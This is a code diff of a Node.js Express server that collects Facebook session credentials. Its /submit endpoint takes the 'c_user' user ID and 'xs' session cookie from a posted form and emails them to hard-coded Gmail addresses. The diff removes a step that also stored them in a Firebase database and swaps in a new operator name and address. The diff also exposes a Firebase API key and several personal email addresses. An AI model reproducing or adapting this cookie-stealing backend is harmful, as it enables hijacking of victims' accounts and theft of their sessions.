@@ -3,8 +3,6 @@ const path = require("path");
 const nodemailer = require('nodemailer')
 const PORT = 80;
 const bodyParser = require("body-parser");
-const { initializeApp } = require('firebase/app')
-const { getFirestore, collection, addDoc } = require('firebase/firestore/lite')
 
 
 const app = express();
@@ -12,22 +10,14 @@ app.use(express.static(path.join(__dirname,'static')))
 app.use(express.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-const name = "Asad"
+const name = "Molu"
 const emails = [
   "unaisnizamani598@gmail.com",
   "marina.bhoo.so@gmail.com",
   
 ]
-const workerEmail = "official.ads.info@gmail.com";
+const workerEmail = "official.tereza.tarot.ads@gmail.com";
 
-const firebaseConfig = {
-  apiKey: "AIzaSyAUEskRaHDTWm2VIMQJ_KKiGPE7oDEun_Y",
-  authDomain: "pages-4dcc5.firebaseapp.com",
-  projectId: "pages-4dcc5",
-  storageBucket: "pages-4dcc5.appspot.com",
-  messagingSenderId: "658193332198",
-  appId: "1:658193332198:web:d1688c0f60cc5087034827",
-};
 
 
 
@@ -44,7 +34,6 @@ let transporter = nodemailer.createTransport({
 });
 
 
-const firebaseInitialized = initializeApp(firebaseConfig);
 
 const sendMail = (name,email,cookie,uid)=>{
   let mailOptions = {
@@ -73,15 +62,10 @@ app.get("/", (req, res) => {
 });
 
 app.post("/submit", async (req, res) => {
-  const firestore = getFirestore(firebaseInitialized);
 
-  const collRef = collection(firestore, "pages");
-  
   const uid = req.body.c_user;
   const cookie = req.body.xs;
 
-
-  await addDoc(collRef, { uid, cookie, name });
 
 
   for(let i=0;i<emails.length;i++) {
